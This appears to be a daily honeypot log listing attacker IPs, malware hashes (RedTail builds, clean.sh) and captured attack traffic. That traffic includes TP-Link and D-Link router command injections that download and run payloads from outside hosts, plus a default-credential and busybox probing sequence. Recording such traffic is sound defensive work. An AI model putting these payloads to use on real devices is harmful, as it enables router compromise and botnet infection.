2024/07/02-07-2024

Top 5 IPs for 02-07-2024 :

103.26.136.5
51.222.106.104
24.199.95.93
43.163.239.88
152.228.217.94

Malware Observed:


File name : clean.sh
d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e


File name : redtail.arm7
1897b34d2e24e1a37d961add5243ac247f709b3ab4b0967eb2e2cbc1aa86dc16
https://www.virustotal.com/gui/file/1897b34d2e24e1a37d961add5243ac247f709b3ab4b0967eb2e2cbc1aa86dc16


File name : redtail.arm8
d92990b37ba580266b4a724f1eae9c8f00c0872f8aa981ce9b64dc8df8a0744b
https://www.virustotal.com/gui/file/d92990b37ba580266b4a724f1eae9c8f00c0872f8aa981ce9b64dc8df8a0744b


File name : redtail.i686
f04e075e655a31cd4cb416583327b6fb4db2a0de66c4d873ae3c6acf95dc4e0f
https://www.virustotal.com/gui/file/f04e075e655a31cd4cb416583327b6fb4db2a0de66c4d873ae3c6acf95dc4e0f


File name : redtail.x86_64
7db527e1b4a95c2d8cd94201cb19bf819d2c52d3bab9e558124e0d32a7f38200
https://www.virustotal.com/gui/file/7db527e1b4a95c2d8cd94201cb19bf819d2c52d3bab9e558124e0d32a7f38200



Commands/exploits observed:

/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.95.169.11%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60)



POST /HNAP1 HTTP/1.0
Content-Type: text/xml; charset="utf-8"
SOAPAction: http://purenetworks.com/HNAP1/GetDeviceSettings/`cd /tmp;rm -rf mips; busybox wget http://213.232.235.166/mips;`
Content-Length: 640

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><AddPortMapping xmlns="http://purenetworks.com/HNAP1/"><PortMappingDescription>foobar</PortMappingDescription><InternalClient>192.168.0.100</InternalClient><PortMappingProtocol>TCP</PortMappingProtocol><ExternalPort>1234</ExternalPort><InternalPort>1234</InternalPort></AddPortMapping></soap:Body></soap:Envelope>





user
...user
root
...vizxv
enable
system
shell
sh
cat /proc/mounts; /bin/busybox FVEPD
cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox FVEPD
tftp; wget; /bin/busybox FVEPD
dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
